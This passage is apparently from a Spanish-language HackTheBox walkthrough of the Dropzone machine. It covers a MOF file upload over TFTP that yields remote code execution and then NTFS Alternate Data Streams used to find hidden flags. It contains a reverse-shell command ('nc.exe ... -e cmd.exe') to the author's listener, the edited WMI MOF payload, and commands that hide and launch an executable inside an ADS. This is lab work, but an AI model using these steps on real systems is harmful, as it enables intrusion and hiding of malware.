+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139google_wbemEXECrb.png" alt="139google_wbemEXECrb" /></p>
+
+<p>Oko, dándole vueltas al archivo, vemos que el contenido del objeto <code>.mof</code> está dentro de la variable <strong>mof</strong> e indica su fin cuando encuentra la cadena <em>EOT</em>, entonces, tomemos tooodas esas líneas y copiémoslas a un archivo de nuestro sistema <code>.mof</code>.</p>
+
+<pre><code class="language-bash">❱ wc -l payload.mof 
+62 payload.mof
+</code></pre>
+
+<p>Vemos varias partes donde toma valores de variables, modifiquemos esas partes para alojar <strong>nuestros</strong> valores:</p>
+
+<p><span style="color: red"><strong>@EXE@</strong></span>: que es donde va el nombre del archivo <code>.exe</code>, cambiémoslo por <code>nc.exe</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139bash_sed_EXE_2_ncEXE.png" alt="139bash_sed_EXE_2_ncEXE" /></p>
+
+<p>En la instrucción número <strong>1</strong>, buscamos la cadena <strong>@EXE@</strong> en el payload, es la número <strong>2</strong> buscamos la cadena <strong>nc.exe</strong>, como no hay match nos responde con error y en la número <strong>3</strong> jugamos con <a href="https://www.ochobitshacenunbyte.com/2019/05/28/uso-del-comando-sed-en-linux-y-unix-con-ejemplos/">sed</a> para jugar con el contenido del archivo, donde yo creo que la mayoría se entiende y la duda puede estar en la <code>g</code>, ella le indica a <strong>sed</strong> que haga el remplazo en todos los matchs que encuentre.</p>
+
+<p><strong>Para decirle que haga el cambio permanente, le tenemos que indicar el parámetro <code>-i</code> a</strong> sed <strong>(:</strong></p>
+
+<p>Ahora en esta instancia, <code>Instance of ActiveScriptEventConsumer as $cons</code>, modificamos la línea donde esta <code>nc.exe</code> para que nos haga una petición a nuestra máquina:</p>
+
+<pre><code class="language-mof">...
+ScriptText = ...ns.Run(\\"nc.exe 10.10.14.10 4433\\");} catch...
+...
+</code></pre>
+
+<p>:)</p>
+
+<p><span style="color: red"><strong>#{mofname}</strong></span>: acá va el nombre del objeto <code>.mof</code>:</p>
+
+<pre><code class="language-bash">❱ sed -i 's/#{mofname}/payload.mof/g' payload.mof
+</code></pre>
+
+<p><span style="color: red"><strong>@CLASS@</strong></span>: que al parecer toma el valor de la clase, pongamos cualquiera:</p>
+
+<pre><code class="language-bash">❱ sed 's/@CLASS@/eAcabo/g' payload.mof | grep -n eAcabo
+2:class MyClasseAcabo
+29:  ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"nc.exe\\");} catch (err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClasseAcabo\\");} catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try {sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";
+40:  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\"MyClasseAcabo\\"";
+59:instance of MyClasseAcabo as $MyClass
+</code></pre>
+
+<pre><code class="language-bash">❱ sed -i 's/@CLASS@/eAcabo/g' payload.mof
+</code></pre>
+
+<p>Listos, no vemos más referencias extrañas…</p>
+
+<p>Lo que hará el objeto al ser compilado será:</p>
+
+<ol>
+  <li>Ejecutará nuestro payload (<code>nc.exe</code>) para que haga una petición hacia nuestro listener.</li>
+  <li>Borrará los dos archivos, tanto el objeto <code>.mof</code> como el binario <code>nc.exe</code> del sistema.</li>
+</ol>
+
+<p>Procedamos a subir los archivos y ver si obtenemos alguna petición:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+listening on [any] 4433 ...
+</code></pre>
+
+<p>Y en el servidor <strong>TFTP</strong> subimos los objetos:</p>
+
+<p>(Recordemos las rutas donde debemos subirlos: <strong>exe</strong>, <code>c:\Windows\System32</code> y <strong>mof</strong>, <code>c:\Windows\System32\wbem\mof</code>).</p>
+
+<pre><code class="language-bash">❱ rlwrap tftp dropzone.htb 69
+tftp&gt; binary
+tftp&gt; put nc.exe /Windows/System32/nc.exe
+Sent 38866 bytes in 8.3 seconds
+tftp&gt; put payload.mof /Windows/System32/wbem/mof/payload.mof
+Sent 2349 bytes in 0.7 seconds
+tftp&gt; 
+</code></pre>
+
+<p>Pero no recibimos nada 😝</p>
+
+<p>Comparando nuestro <code>.mof</code> con los ejemplos que vimos antes, encontramos una diferencia relacionada con los <strong>escapes</strong> de caracteres.</p>
+
+<p>Ejemplo de la web:</p>
+
+<pre><code class="language-mof">#pragma namespace ("\\\\.\\root\\subscription")
+</code></pre>
+
+<p>El nuestro:</p>
+
+<pre><code class="language-mof">#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
+</code></pre>
+
+<p>Vale, pues en todo el archivo hay varios “escapes” de ese estilo, así que juguemos de nuevo con <strong>sed</strong> para indicarle que si encuentra 4 <code>\</code> los remplace por 2 <code>\</code>:</p>
+
+<pre><code class="language-bash">❱ head payload.mof -n 1
+#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
+</code></pre>
+
+<pre><code class="language-bash">❱ sed 's/\\\\/\\/g' payload.mof | head -n 1
+#pragma namespace("\\\\.\\root\\cimv2")
+</code></pre>
+
+<p>Listo, hagámoslo permanente:</p>
+
+<pre><code class="language-bash">❱ sed -i 's/\\\\/\\/g' payload.mof
+</code></pre>
+
+<p>Ahora, volvamos a intentar a ver si ese era el problema:</p>
+
+<pre><code class="language-bash">tftp&gt; binary
+tftp&gt; put nc.exe /Windows/System32/nc.exe
+Sent 38616 bytes in 8.3 seconds
+tftp&gt; put payload.mof /Windows/System32/wbem/mof/payload.mof
+Sent 2218 bytes in 0.7 seconds
+tftp&gt; 
+</code></pre>
+
+<p>Y en nuestro listener:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+listening on [any] 4433 ...
+connect to [10.10.14.10] from dropzone.htb [10.10.10.90] 1066
+</code></pre>
+
+<p>TENEMOS RESPUESTAAAAAAAAAAAAAAAAAAaaaAAaasdfasdflkjasdgklñ!!</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139google_gif_muppetDance.gif" style="display: block; margin-left: auto; margin-right: auto; width: 40%;" /></p>
+
+<p>Listoooooooooooo, podríamos generar un payload con <code>msfvenom</code> que al ejecutarse nos lanzara una <strong>Reverse Shell</strong>, pero probando con el mismo <code>nc.exe</code> podemos indicarle la instrucción de siempre:</p>
+
+<pre><code class="language-mof">...
+ScriptText = ...ns.Run(\"nc.exe 10.10.14.10 4433 -e cmd.exe\");} catch...
+...
+</code></pre>
+
+<p>Con eso le indicamos que una vez se obtenga la petición en nuestro servidor (listener) nos lance una <code>cmd.exe</code>, o sea, una terminal (:</p>
+
+<p>Subimos los binarios y en nuestro listeneeeeeer:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139bash_administrator_revSH.png" alt="139bash_administrator_revSH" /></p>
+
+<p>Perfectisimoooooooooooooooooooooooo, no tenemos habilitado el comando <strong>whoami</strong> ni <code>echo %username</code> para ver con que usuario estamos, pero, si logramos escribir en esas rutas tenemos constancia que somos administradores del sistema :P</p>
+
+<p>Veamos las flags:</p>
+
+<pre><code class="language-powershell">C:\&gt;dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is 7CF6-55F6
+
+ Directory of C:\
+
+09/05/2018  10:39     &lt;DIR&gt;          114de795ed2964dbe35a
+09/05/2018  05:22                  0 AUTOEXEC.BAT
+09/05/2018  05:22                  0 CONFIG.SYS
+09/05/2018  08:50     &lt;DIR&gt;          Documents and Settings
+09/05/2018  10:41     &lt;DIR&gt;          Program Files
+10/05/2018  02:49     &lt;DIR&gt;          WINDOWS
+               2 File(s)              0 bytes
+               4 Dir(s)   7.634.173.952 bytes free
+
+C:\&gt;
+</code></pre>
+
+<pre><code class="language-powershell">C:\&gt;cd "Documents and Settings"
+C:\Documents and Settings&gt;dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is 7CF6-55F6
+
+ Directory of C:\Documents and Settings
+
+09/05/2018  08:50     &lt;DIR&gt;          .
+09/05/2018  08:50     &lt;DIR&gt;          ..
+09/05/2018  10:20     &lt;DIR&gt;          Administrator
+09/05/2018  05:21     &lt;DIR&gt;          All Users
+               0 File(s)              0 bytes
+               4 Dir(s)   7.634.165.760 bytes free
+
+C:\Documents and Settings&gt;
+</code></pre>
+
+<p>Solo hay un usuario, en su directorio <strong>Desktop</strong> vemos:</p>
+
+<pre><code class="language-powershell">C:\Documents and Settings\Administrator\Desktop&gt;dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is 7CF6-55F6
+
+ Directory of C:\Documents and Settings\Administrator\Desktop
+
+02/03/2021  07:59     &lt;DIR&gt;          .
+02/03/2021  07:59     &lt;DIR&gt;          ..
+10/05/2018  10:10     &lt;DIR&gt;          flags
+10/05/2018  10:12                 31 root.txt
+               1 File(s)             31 bytes
+               3 Dir(s)   7.634.161.664 bytes free
+
+C:\Documents and Settings\Administrator\Desktop&gt;
+</code></pre>
+
+<p>Si visualizamos la flag, tenemos:</p>
+
+<pre><code class="language-powershell">C:\Documents and Settings\Administrator\Desktop&gt;type root.txt
+It's easy, but not THAT easy...
+C:\Documents and Settings\Administrator\Desktop&gt;
+</code></pre>
+
+<p>Jmmm… Dentro de la carpeta llamada <strong>flags</strong> tenemos:</p>
+
+<pre><code class="language-powershell">C:\Documents and Settings\Administrator\Desktop\flags&gt;dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is 7CF6-55F6
+
+ Directory of C:\Documents and Settings\Administrator\Desktop\flags
+
+10/05/2018  10:10     &lt;DIR&gt;          .
+10/05/2018  10:10     &lt;DIR&gt;          ..
+10/05/2018  10:09                 76 2 for the price of 1!.txt
+               1 File(s)             76 bytes
+               2 Dir(s)   7.634.149.376 bytes free
+
+C:\Documents and Settings\Administrator\Desktop\flags&gt;
+</code></pre>
+
+<p>Y en el archivo:</p>
+
+<pre><code class="language-powershell">C:\Documents and Settings\Administrator\Desktop\flags&gt;type "2 for the price of 1!.txt"
+For limited time only!
+
+Keep an eye on our ADS for new offers &amp; discounts!
+C:\Documents and Settings\Administrator\Desktop\flags&gt;
+</code></pre>
+
+<p>:o</p>
+
+<p>…</p>
+
+<h2 id="movimiento-lateral-ads">Movimiento lateral : ADS -&gt; flags <a href="#movimiento-lateral-ads">#</a></h2>
+
+<p>Buscando por <strong>ads</strong> (alguna carpeta con referencia a promociones o algún programa que se relacionara) en el sistema, no encontré nada :)</p>
+
+<p>Con una simple petición en la web con: “<strong>ads windows</strong>”, encontramos algo llamado <strong><em>Flujos de datos alternativos</em></strong> (en ingles <strong><em>Alternate Data Stream - ADS</em></strong>), veamos si lo podemos relacionar con la máquina.</p>
+
+<h4 id="ads---khe-ez-eztho">ADS - ¿khe ez eztho?</h4>
+
+<p>Es una característica de los ficheros <strong>NTFS</strong> (New Techonology File System: sistema de archivos que permite organizar datos en discos duros y otros medios de almacenamiento) que <strong>habilita el guardar archivos “ocultos” dentro de otros archivos o carpetas</strong> en el sistema. <a href="http://www.christiandve.com/2017/06/flujos-alternativos-datos-alternate-data-streams-windows-ads/">ADS en Windows</a>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139google_gif_fascinating.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;" /></p>
+
+<p>Y si, interesante, pueda que debamos buscar algún <strong>ADS</strong> en los propios archivos que hacen referencia a las flags, (tiene toda la pinta de ser por ahí).</p>
+
+<ul>
+  <li><a href="http://www.christiandve.com/2017/06/flujos-alternativos-datos-alternate-data-streams-windows-ads/">Lindo post en español para entender los flujos de datos alternativos (<strong>ADS</strong>)</a>.</li>
+</ul>
+
+<p>Primero veamos como funciona para despues encontrar formas de ver <strong>ADS</strong>’s en archivos…</p>
+
+<blockquote>
+  <p><strong>Alternate Data Streams</strong> are simple to create and entail little or no skill to use. Common DOS commands such as <code>type</code> can be used to create <strong>Alternate Data Streams (ADS)</strong>. These commands are used in conjunction with a redirect [<code>&gt;</code>] and colon [<code>:</code>] to <strong>fork</strong> one file <strong>into</strong> another. <a href="https://www.sciencedirect.com/topics/computer-science/alternate-data-stream">Alternate Data Stream</a>.</p>
+</blockquote>
+
+<p>El anterior recurso nos da un ejemplo sencillo:</p>
+
+<pre><code class="language-powershell">type c:\malicious.exe &gt; c:\winnt\system32\calc.exe:malicious.exe
+</code></pre>
+
+<p>Ahondemos en algo muuucho más sencillo, así nos queda claro el funcionamiento, poder leer el ejemplo anterior y entenderlo mejor…</p>
+
+<h5 id="creamos-ads-en-archivo-random">Creamos ADS en archivo random</h5>
+
+<p><strong>Creamos objeto</strong>:</p>
+
+<pre><code class="language-powershell">C:\totest&gt;echo "hola como estoy" &gt; hola.txt
+C:\totest&gt;type hola.txt
+"hola como estoy"
+</code></pre>
+
+<p>Bien, todo normal, ahoraaaaaa</p>
+
+<h5 id="agregamos-ads-en-archivo-holatxt">Agregamos ADS en archivo hola.txt</h5>
+
+<p>Guardemos otra cadena en el archivo <code>hola.txt</code>, con la ayuda de la herramienta <strong>type</strong> en <em>Windows</em> lograremos agregar el <strong>ADS</strong> al objeto:</p>
+
+<pre><code class="language-powershell">C:\totest&gt;echo "pero claro que si" &gt; claro.txt
+C:\totest&gt;dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is 7CF6-55F6
+
+ Directory of C:\totest
+
+31/05/2021  11:15     &lt;DIR&gt;          .
+31/05/2021  11:15     &lt;DIR&gt;          ..
+31/05/2021  11:15                 22 claro.txt
+31/05/2021  11:15                 20 hola.txt
+               2 File(s)             42 bytes
+               2 Dir(s)   7.633.752.064 bytes free
+
+C:\totest&gt;type claro.txt &gt; hola.txt:claro.txt
+</code></pre>
+
+<p>Ahora vemos su contenido</p>
+
+<h5 id="validando-la-inserción-del-contenido-oculto-dentro-del-archivo-holatxt">Validando la inserción del contenido oculto dentro del archivo hola.txt</h5>
+
+<p>Jugamos con <strong>more</strong>:</p>
+
+<pre><code class="language-powershell">C:\totest&gt;more &lt; hola.txt
+"hola como estoy" 
+C:\totest&gt;
+</code></pre>
+
+<pre><code class="language-powershell">C:\totest&gt;more &lt; hola.txt:claro.txt
+"pero claro que si"
+C:\totest&gt;
+</code></pre>
+
+<p>Perfecto, ya tenemos oculto dentro del archivo <code>hola.txt</code> el contenido del objeto <code>claro.txt</code> (:</p>
+
+<p>Para el caso de querer ocultar un objeto ejecutable (por ejemplo <code>calc.exe</code>) en otro archivo, hacemos los mismos pasos solo que si queremos ejecutar el <strong>ADS</strong> (<code>.exe</code> incrustado) lo llamamos así:</p>
+
+<pre><code class="language-powershell">C:\totest&gt;type c:\windows\system32\calc.exe &gt; hola.txt:calc.exe
+C:\totest&gt;start c:\totest\hola.txt:calc.exe
+</code></pre>
+
+<p>Y ejecutaría la calculadora :P</p>
+
+<blockquote>
+  <p>Tomado de: <a href="https://blog.foldersecurityviewer.com/ntfs-alternate-data-streams-the-good-and-the-bad/"><strong>ADS</strong> - The good and the bad</a>.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Otro ejemplo sin necesidad de crear un archivo:</p>
+
+<pre><code class="language-powershell">C:\totest&gt;echo "nop, asi no" &gt; claro.txt:nop.txt
+</code></pre>
+
+<pre><code class="language-powershell">C:\totest&gt;more &lt; claro.txt
+"pero claro que si"
+C:\totest&gt;more &lt; claro.txt:nop.txt
+"nop, asi no" 
+</code></pre>
+
+<p>Y bueno hay muchos ejemplos, se vuelve superinteresante cuando piensas todo lo que puedes llegar a hacer con esto…</p>
+
+<p>…</p>
+
+<h5 id="validamos-existencia-de-ads-en-archivos">Validamos existencia de ADS en archivos</h5>
+
+<p>Pero listo, ahora la duda: ¿Cómo sé si algún archivo tiene un <strong>ADS</strong> dentro? Pues bien, en <a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">esta introducción a los <strong>ADS</strong></a> responden esta pregunta con un software llamado <code>streams.exe</code>. Dando algunas vueltas para encontrar el binario, no solo encontramos <strong>ese</strong>, si no varios más.</p>
+
+<ul>
+  <li><a href="https://security.stackexchange.com/questions/34168/how-can-i-identify-discover-files-hidden-with-ads">Respuesta en foro sobre maneras de identificar archivos ocultos con <strong>ADS</strong></a>.</li>
+</ul>
+
+<p>Y <a href="https://api.256file.com/streams64.exe/en-download-190154.html">acá</a> tenemos un comprimido con muuuuchos binarios que nos ayudaran con esa tarea (el que usaremos será <code>streams.exe</code>):</p>
+
+<ul>
+  <li><a href="http://download.sysinternals.com/files/SysinternalsSuite.zip">Si das clic te descargará el comprimido de una vez</a>.</li>
+</ul>
+
+<p>Descomprimimos, tomamos el binario y simplemente lo subimos al sistema:</p>
+
+<pre><code class="language-bash">tftp&gt; put streams.exe /totest/streams.exe
+Sent 342392 bytes in 73.4 seconds
+tftp&gt; 
+</code></pre>
+
+<p>Validamos:</p>
+
+<pre><code class="language-powershell">C:\totest&gt;dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is 7CF6-55F6
+
+ Directory of C:\totest
+
+31/05/2021  11:40     &lt;DIR&gt;          .
+31/05/2021  11:40     &lt;DIR&gt;          ..
+31/05/2021  11:22                 22 claro.txt
+31/05/2021  11:15                 20 hola.txt
+31/05/2021  11:41            342.392 streams.exe
+               3 File(s)        342.434 bytes
+               2 Dir(s)   7.633.166.336 bytes free
+
+C:\totest&gt;
+</code></pre>
+
+<p>asdfPerfectisimo, la ejecución es supersencilla, solo le debemos pasar el archivo o directorio (para esto le indicas el parámetro <code>-s</code>, así sabe que debe hacerlo recursivamente) donde buscar:</p>
+
+<p>Primero aceptamos unos términos usando <code>-accepteula</code>:</p>
+
+<pre><code class="language-powershell">C:\totest&gt;streams.exe -accepteula
+
+streams v1.60 - Reveal NTFS alternate streams.
+Copyright (C) 2005-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+usage: streams.exe [-s] [-d] &lt;file or directory&gt;
+-s     Recurse subdirectories
+-d     Delete streams
+-nobanner
+       Do not display the startup banner and copyright message.
+
+C:\totest&gt;
+</code></pre>
+
+<p>Y ahora si a jugar:</p>
+
+<pre><code class="language-powershell">C:\totest&gt;streams.exe -s c:\totest
+
+streams v1.60 - Reveal NTFS alternate streams.
+Copyright (C) 2005-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+c:\totest\claro.txt:
+         :nop.txt:$DATA 16
+c:\totest\hola.txt:
+       :claro.txt:$DATA 22
+      :claroquesi:$DATA 0
+
+C:\totest&gt;
+</code></pre>
+
+<p>En nuestro directorio vemos todos los objetos ocultos que habíamos creado antes (:</p>
+
+<p>Pues hagamos lo mismo pero con los archivos de <strong>flags</strong> a ver que:</p>
+
+<pre><code class="language-powershell">C:\totest&gt;streams.exe "c:\Documents and Settings\Administrator\Desktop\root.txt"
+
+streams v1.60 - Reveal NTFS alternate streams.
+Copyright (C) 2005-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+C:\totest&gt;
+</code></pre>
+
+<p>Contra <code>root.txt</code> no detecta ningún <strong>ADS</strong>, veamos con el archivo que está dentro de la carpeta flags:</p>
+
+<pre><code class="language-powershell">C:\totest&gt;streams.exe "c:\Documents and Settings\Administrator\Desktop\flags\2 for the price of 1!.txt"
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139flags.png" alt="139flags" /></p>
+
+<p>OPAAAAAAAAAAAAAAAaa, tamoooooooooooooooo melos ;) Encontramos las flags ocultas en el archivo, así que, hemos terminao por ahora.</p>
+
+<p>…</p>
+
+<p>Brutal máquina, la explotación inicial es una locura, me encanta como de una subida de archivos por <strong>FTP</strong> se puede volcar en un <strong>RCE</strong>, interesantísimo proceso. Y el como llegamos a las flags me encanto, primero porque no lo había usado y segundo porque es un tema superdiabólico eh jajaj, bastante llamativo para jugar con él.</p>
+
+<p>Weno, espero haberme hecho entender y sobre todo espero que hayan aprendido algo nuevo, como siempre, <strong>a seguir rompiendo todo!!</strong> 🥰</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Dropzone&url=http://localhost:4000/htb/dropzone" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#ADS">ADS</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#MOF">MOF</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#TFTP">TFTP</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#WMI">WMI</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/jeeves">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114banner.png" alt="HackTheBox - Jeeves"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/jeeves">HackTheBox - Jeeves</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio. La elegancia de Jenkins que nos permite jugar con scripts de Groovy para obtener RCE :O Archivos .kdbx con contraseñas dentro (¿qué puede pasar?) y descubriremos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">25 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/article/ads-windows">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/ADS-Windows/ads_banner.png" alt="Ocultando data en archivos de Windows (con ADS)"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/article/ads-windows">Ocultando data en archivos de Windows (con ADS)</a>
+                
+            </h2>
+            <h4 class="card-text">Jugaremos con Alternate Data Stream o flujos de datos alternativos, veremos como un atacante (o víctima) puede ocultar información dentro de archivos ya sea para asegurarlos o para hacer locuras....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">15 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
